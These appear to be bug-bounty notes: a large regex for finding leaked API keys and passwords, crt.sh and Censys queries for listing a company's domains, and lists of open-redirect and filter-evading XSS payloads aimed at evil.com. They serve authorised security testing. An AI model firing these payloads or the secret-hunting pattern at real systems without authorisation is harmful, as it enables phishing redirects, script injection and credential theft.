Search for all leaked keys/secrets using one regex! 


(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]

---------------------

# bug-bounty
Find domains 
http://crt.sh/

https://crt.sh/?O=Sony&output=json
  https://crt.sh/?q=Sony&output=json
https://crt.sh/?q=f3cd41a6035ba1b1be1670386918893734363e53


parsed.issuer.organization.raw: "Apple Inc."
https://search.censys.io/certificates


Basic Payloads:-

You can try these basic payloads to test for Open redirect vulnerability on any application

https://example.com/login?redirect=http://evil.com
https://example.com/login?redirect=javascript:alert(1);
Here evil.com is our website and if example.com redirects you to this, then its vulnerable. If this is resolved then try this payloads:-

https://example.com/login?redirect=http://example.com@evil.com
https://example.com/login?redirect=http://example.com%09.evil.com
If these are resolved, then try these:-

https://example.com/login?redirect=http://example.com%3F.evil.com
https://example.com/login?redirect=http://example.com%2523.evil.com
https://example.com/login?redirect=http://evil.com?c=.example.com
https://example.com/login?redirect=http://example.com%252Eevil.com
Other Open Redirect Payloads:-

https://example.com/login?next=//example.com@evil.com
https://example.com/login?next=/\/evil.com
https://example.com/login?next=//%2F/evil.com
https://example.com/login?next=/%0D/evil.com
https://example.com/login?next=/%5Cevil.com
https://example.com/login?next=//evil%E3%80%82com
https://example.com/login?next=%09http:///example.coc%40evil.com
Try this Intigriti open redirect payload generator tool here 


XSS Payloads for Open redirect:-

";alert(0);//
java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0` java%09scrip%07t:prompt`0` jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
https://www.cyberick.com/post/open-redirect-and-its-bypasses
